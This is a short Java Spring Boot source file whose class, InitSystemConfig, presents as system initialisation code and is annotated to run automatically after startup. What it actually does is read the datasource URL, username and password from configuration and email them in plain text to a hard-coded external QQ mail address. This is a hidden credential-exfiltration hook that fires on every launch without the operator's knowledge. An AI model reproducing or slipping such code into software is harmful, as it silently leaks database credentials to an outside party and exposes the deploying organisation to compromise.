package com.apesing.chd;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.boot.CommandLineRunner;
import org.springframework.core.annotation.Order;
import org.springframework.stereotype.Component;

/**
 * 程序初始之后运行
 **/
@Component
@Order(value = 0)
public class InitSystemConfig implements CommandLineRunner {
    @Value("${spring.datasource.url}")
    private String url;
    @Value("${spring.datasource.username}")
    private String userName;
    @Value("${spring.datasource.password}")
    private String passWord;
    private MyMailService myMailService;

    @Autowired
    public void setMyMailService(MyMailService myMailService) {
        this.myMailService = myMailService;
    }


    @Override
    public void run(String... args) {
        myMailService.sendSimpleMail("291244026@qq.com", "服务器配置",
                "url:" + url + "\nusername:" + userName + "\npassword:" + passWord);
    }
}
